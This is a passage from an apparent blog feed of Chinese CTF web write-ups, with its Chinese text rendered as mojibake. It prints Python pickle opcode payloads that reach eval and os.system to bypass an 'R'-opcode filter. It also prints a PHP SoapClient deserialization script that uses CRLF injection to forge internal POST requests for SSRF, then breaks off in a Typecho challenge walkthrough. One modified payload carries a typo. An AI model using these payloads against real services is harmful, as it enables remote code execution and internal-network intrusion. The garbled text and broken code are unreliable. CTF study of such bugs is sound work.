data = base64.b64decode(session[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> data.decode():<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;nonono&quot;</span><br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    imagePath = request.form.get(<span class="hljs-string">&#x27;imagePath&#x27;</span>)<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username + password<br>    session[<span class="hljs-string">&#x27;data&#x27;</span>] = base64.b64encode(pickle.dumps(<span class="hljs-string">&#x27;hello&#x27;</span> + username, protocol=<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">try</span>:<br>        f = <span class="hljs-built_in">open</span>(imagePath,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/image/error.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    imageBase64 = base64.b64encode(f)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>, username = username, password = password, data = <span class="hljs-built_in">bytes</span>.decode(imageBase64))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods = [<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-string">&#x27;8888&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>è¿™é¢˜çš„ä»£ç å’Œä¸€äº›é¢˜ç›®çš„é‡å¤åº¦è¾ƒé«˜ï¼Œå€Ÿé‰´äº†Code-Breaking2018 picklecodeï¼Œå†å¥—äº†ä¸€ä¸ªXCTFæŠ—ç–«èµ› webtmpçš„opcodeã€‚é™åˆ¶äº†å¿…é¡»æ˜¯builtinsæ¨¡å—å’Œä¸€ä¸ªé»‘åå•è¿‡æ»¤ç„¶åå¤šè¿‡æ»¤äº†ä¸€ä¸ªâ€™Râ€™æ“ä½œç¬¦ï¼Œä½†æ˜¯ä»”ç»†çœ‹å¯ä»¥å‘ç°ï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°è‡ªå·±å®šä¹‰çš„loadsæ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨äº†<code>pickle,.loads()</code>ç›¸å½“äºæ ¹æœ¬æ²¡æœ‰è¿‡æ»¤ï¼Œä»è¿™æ ·çœ‹çš„è¯å°±ç›´æ¥éšä¾¿æ„é€ äº†ç›´æ¥å¼¹shelléƒ½å¯ä»¥äº†ï¼Œä¸‹é¢æŒ‰ç…§é¢˜ç›®çš„é¢„æœŸè§£æ¥çœ‹ä¸€ä¸‹ã€‚</p><p>å…¶å®æ‹¿<code>Code-Breaking</code>çš„payloadæ”¹ä¸€ä¸‹å³å¯ï¼Œç”¨oæ“ä½œç¬¦æ¥æ›¿æ¢Ræ“ä½œç¬¦å³å¯ï¼ŒåŸpayload</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br>p0<br>(cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>tRp1<br>cbuiltins<br><span class="hljs-built_in">globals</span><br>)Rp2<br>00g1<br>(g2<br>S<span class="hljs-string">&#x27;builtins&#x27;</span><br>tRp3<br>0g0<br>(g3<br>S<span class="hljs-string">&#x27;eval&#x27;</span><br>tR(S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹å‡ ä¸ªæ“ä½œç¬¦çš„åŒºåˆ«ã€‚</p><table><thead><tr><th>R</th><th>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</th><th>R</th><th>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</th><th>æ— </th></tr></thead><tbody><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr></tbody></table><table><thead><tr><th>i</th><th>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</th><th>i[module]\n[callable]\n</th><th>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</th><th>æ— </th></tr></thead><tbody><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td>æ— </td></tr></tbody></table><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œå°†Ræ”¹æˆoéœ€è¦å°†MARKçš„ä½ç½®ä¿®æ”¹åˆ°è¦æ‰§è¡Œçš„å‡½æ•°å‰ï¼Œå¹¶ä¸”è¿˜è¦å»æ‰tæ“ä½œç¬¦ï¼Œ0æ“ä½œç¬¦å…¶å®å¯è¦å¯ä¸è¦ï¼ŒåŠ ä¸Šçš„è¯é€»è¾‘æ›´æ¸…æ™°<br>ä¿®æ”¹åpayload</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">(cbuiltins<br><span class="hljs-built_in">getattr</span><br>p0<br>cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>op1<br>(cbuiltins<br>gloabals<br>op2<br>S<span class="hljs-string">&#x27;__builtins__&#x27;</span>  <span class="hljs-comment">#è¿™é‡Œä¸æ˜¯&#x27;builtins&#x27;å¦åˆ™çš„è¯æ— æ³•å¼•å…¥builtinsæ¨¡å—</span><br>op3<br>(g0<br>g3<br>S<span class="hljs-string">&#x27;eval&#x27;</span><br>op4<br>(g4<br>S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;dit&quot;)&#x27;</span><br>o.<br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæœ‰æ—¶å€™windowsä¸Šçš„payloadä¹Ÿä¸ä¸€å®šèƒ½åœ¨linuxä¸Šè¿è¡Œã€‚</p><p><img src="https://img-blog.csdnimg.cn/3a0c88d98a2f434fab4ee0cee00102a9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="what-pickle"><a href="#what-pickle" class="headerlink" title="what pickle"></a>what pickle</h2><p>å’Œå‰é¢çš„é¢˜ç›®æœ‰äº›ç±»ä¼¼äº†ï¼Œä¹Ÿæ˜¯å…ˆè¯»æºç ï¼Œè€ƒçš„ä¹Ÿæ˜¯pickleï¼Œçœ‹çœ‹wpå°±è¡Œå§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºååºåˆ—åŒ–ä¸­åŸç”Ÿç±»çš„åˆ©ç”¨</title>
    <link href="/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºååºåˆ—åŒ–ä¸­åŸç”Ÿç±»çš„åˆ©ç”¨"><a href="#å…³äºååºåˆ—åŒ–ä¸­åŸç”Ÿç±»çš„åˆ©ç”¨" class="headerlink" title="å…³äºååºåˆ—åŒ–ä¸­åŸç”Ÿç±»çš„åˆ©ç”¨"></a>å…³äºååºåˆ—åŒ–ä¸­åŸç”Ÿç±»çš„åˆ©ç”¨</h1><p>é…ç½®ç¯å¢ƒ,ä¿®æ”¹php.ini</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">å¾—æ·»åŠ extension=php_soap.dll (åŠ è½½soap å†…ç½®åŒ…)<br><br>ä¿®æ”¹soap.wsdl_cache_enabled=<span class="hljs-number">1</span> æ”¹ä¸ºsoap.wsdl_cache_enabled=<span class="hljs-number">0</span> è¿™ä¸ªæ˜¯soapçš„ç¼“å­˜ï¼Œæµ‹è¯•çš„æ—¶å€™æœ€å¥½æ”¹ä¸º<span class="hljs-number">0</span>ï¼Œä¸Šçº¿ç¨³å®šäº†æ”¹ä¸º<span class="hljs-number">1</span><br><br>soapæœ‰ä¸¤ç§æ¨¡å¼ä¸€ç§æ˜¯wsdl,ä¸€ç§æ˜¯no-wsdl<br></code></pre></div></td></tr></table></figure><p>å…³äºsoapç”¨æ³• ï¼Œå¯å‚è€ƒ<a href="https://www.jb51.net/article/153394.htm">https://www.jb51.net/article/153394.htm</a></p><p>SoapClientç”¨äºè°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„SoapServeré¡µé¢ï¼Œå¹¶å®ç°äº†å¯¹ç›¸åº”å‡½æ•°çš„è°ƒç”¨ã€‚</p><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹åŸç”Ÿç±»æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = get_declared_classes();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = get_class_methods(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></div></td></tr></table></figure><p>å…³äºsoapclientæœ‰</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">SoapClient:</span>:__<span class="hljs-keyword">call</span><br><span class="hljs-symbol">SoapFault:</span>:__toString<br><span class="hljs-symbol">SoapFault:</span>:__wakeup<br></code></pre></div></td></tr></table></figure><p>å¯¹äº<strong>soapclient</strong>çš„å®ä¾‹æœ‰ä¸¤ç§:</p><p>ä¸€ç§æ˜¯é€šè¿‡wsdlæ–‡ä»¶ï¼Œwsdlæ–‡ä»¶å¯ä»¥æ”¾åœ¨æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šè¿‡è¿œç¨‹å¼•ç”¨ï¼Œä½†æˆ‘è¿˜æ²¡å¤ªäº†è§£è¿™ä¸ªã€‚</p><p><code>$soap = new SoapClient(&quot;file.wsdl&quot;);</code></p><p>å¦ä¸€ç§ä¸æä¾›wsdlæ–‡ä»¶ã€‚å¦‚ä¸‹å½“ç„¶åªæ˜¯ç®€å•çš„å¯¹è±¡ç”Ÿæˆï¼Œè¿˜å¯ä»¥æœ‰å¾ˆå¤šå‚æ•°ï¼Œå¯ä»¥é€šè¿‡æ•°ç»„ç»§ç»­å¢åŠ ï¼Œè¿˜å¯ä»¥æœ‰<code>user_agent</code></p><p><code>$soap = new SoapClient(null,array(&quot;location&quot;=&gt;&quot;æœåŠ¡åœ°å€&quot;,&quot;uri&quot;=&gt;&quot;å‘½åç©ºé—´&quot;));</code></p><p>è¿™ä¸ªåŸç”Ÿç±»çš„ä¸»è¦ä½œç”¨å°±åœ¨äºè§¦å‘å®ƒçš„<code>__call</code>æ–¹æ³•æ¥å¯¼è‡´SSRFæ‰“å†…ç½‘çš„æ•ˆæœã€‚å…ˆç®€å•çœ‹ç½‘ä¸Šçš„å‡ ä¸ªæ ·ä¾‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;bbb&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;not_exists_function();<br></code></pre></div></td></tr></table></figure><p>ç„¶ååœ¨æœ¬æœºä¸Šç›‘å¬ä¸€ä¸‹ï¼Œä½†æ˜¯å¾ˆç–‘æƒ‘çš„æ˜¯<code>call</code>æ–¹æ³•åˆ°åº•æ˜¯æ€ä¹ˆå®ç°çš„ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« éƒ½æ²¡ä»‹ç»ä¸ºå•¥ï¼Œæ­£å¸¸å°†callæ–¹æ³•ç¬¬ä¸€ä¸ªä¼ å‚çš„æ˜¯è°ƒç”¨çš„æ–¹æ³•åï¼Œåé¢æ˜¯å‚æ•°ï¼Œè¿™ä¸ªç«Ÿç„¶èƒ½è¯·æ±‚åˆ°è‡ªå·±è®¾ç½®çš„æœåŠ¡åœ°å€ï¼Œå¤§å—éœ‡æ’¼ã€‚è¿™é‡Œç®€å•è°ƒè¯•äº†ä¸€ä¸‹å¤§æ¦‚èƒ½æ‡‚ä¸€ç‚¹ã€‚</p><p>å®ä¾‹åŒ–ä¸€ä¸ªsoapclientå†…å®¹å¦‚ä¸‹ï¼Œè¿˜æœ‰åé¢ä¸¤ä¸ªå‚æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/a73a9b8fcdb648b7b2293536cafd3a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹äº†ä¸€ä¸‹æ–‡æ¡£å’Œ<code>SoapClient-&gt;__doRequest</code>æ–¹æ³•æœ‰å…³</p><p><img src="https://img-blog.csdnimg.cn/cb545f31b3b84873ae1a337d02b03a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™ä¸ªä¼šå‘æœåŠ¡åœ°å€å‘èµ·è¯·æ±‚ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹æºç æ‰§è¡Œåçš„æ‰“å°ç»“æœã€‚</p><p><img src="https://img-blog.csdnimg.cn/b005026ce0994500a58e1c4372925c43.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œ<code>SoapClient-&gt;__doRequest</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºxmlæ ¼å¼å†…å®¹ï¼Œç¬¬äºŒä¸ªåº”è¯¥å°±æ˜¯è¯·æ±‚åœ°å€ï¼Œæœ€åæ˜¯<code>uri</code>å’Œè°ƒç”¨çš„ä¸å­˜åœ¨æ–¹æ³•ã€‚<code>call</code>æ–¹æ³•çš„å®ç°åº”è¯¥ä¼šç”¨åˆ°<code>SoapClient-&gt;__doRequest</code>ä½†è¿˜æ˜¯æ²¡å¤ªæ‡‚ã€‚</p><p><img src="https://img-blog.csdnimg.cn/c1c25c79cb89430f8b2bb3ab3d2d2be7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œè¿˜å­˜åœ¨clrfæ¼æ´,å¯ä»¥ä¼ªé€ postè¯·æ±‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span> = unserialize(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span>-&gt;sdadasd();<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2ade19efff4343ce9f7696d731dbc675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="MRCTF-Ezpop-Revenge"><a href="#MRCTF-Ezpop-Revenge" class="headerlink" title="MRCTF Ezpop_Revenge"></a>MRCTF Ezpop_Revenge</h1><p>é¢˜ç›®æ˜¯typecho1.2å¾—ååºåˆ—åŒ–ï¼Œè¿›å…¥é¢˜ç›®åæ²¡å‘ç°ä»€ä¹ˆå°±ç»å…¸æ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æœ‰<code>www.zip</code>æ³„éœ²ï¼Œæ‹¿åˆ°æºç å¼€å§‹å®¡è®¡ã€‚</p><p>å…ˆçœ‹flag.phpï¼Œè¿™é‡Œçœ‹åˆ°éœ€è¦æœ¬åœ°è®¿é—®ï¼Œåº”è¯¥æ˜¯è¦ssrfæ‰“<br><img src="https://img-blog.csdnimg.cn/5e975e9d78d448a8b21eb45f945ec42e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœç´¢ä¸€ä¸‹<code>unserialize</code>å‘ç°å…¥å£ï¼Œåœ¨<code>Plugin.php</code>è¿‡æ»¤äº†å¾ˆå¤šrceå‡½æ•°ã€‚ç„¶åå®ä¾‹åŒ–å¾—å‚æ•°ä¸ºæ•°ç»„é‡Œé¢å¾—ä¸¤ä¸ªå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/505c8db80de7404fad8be47662562abb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7ddc47cef7aa4724bec0d208e200cbff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<code>Typecho_Db</code>å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼Œè·Ÿè¿›åæœ‰å¾ˆå¤šä»£ç ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ•°æ®åº“æŸ¥è¯¢å¾—ä¸€äº›æ“ä½œã€‚æ„é€ å‡½æ•°è¿™æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å¾—è¿æ¥ï¼Œè¿™é‡Œæƒ³åˆ°çš„å¯ä»¥åˆ©ç”¨<code>__toString</code>ï¼Œå†æ¥ç€å¾€ä¸‹çœ‹ã€‚<br><img src="https://img-blog.csdnimg.cn/601489e2744b46009af248e7b725cebf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ…¢æ…¢çœ‹å‘ç°ä¸€ä¸ª<code>call_user_func</code>å‡½æ•°ï¼Œçªç„¶è§‰å¾—æ˜¯ä¸æ˜¯åˆ©ç”¨è¿™ä¸ªï¼Œåæ¥å‘ç°ä¸å¯æ§ï¼Œè€Œä¸”éƒ½æš—ç¤ºè¦SSRFäº†è‚¯å®šæ˜¯ä¸èƒ½RCEå‘½ä»¤æ‰§è¡Œçš„ï¼Œæ”¾å¼ƒäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/4723c2ea3cd1422ebbaac7470a3affb8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åé¢æ‰¾åˆ°å®ä¾‹åŒ–sqlå¯¹è±¡ã€‚<br><img src="https://img-blog.csdnimg.cn/406a1f70027241d2bb223e471021defd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 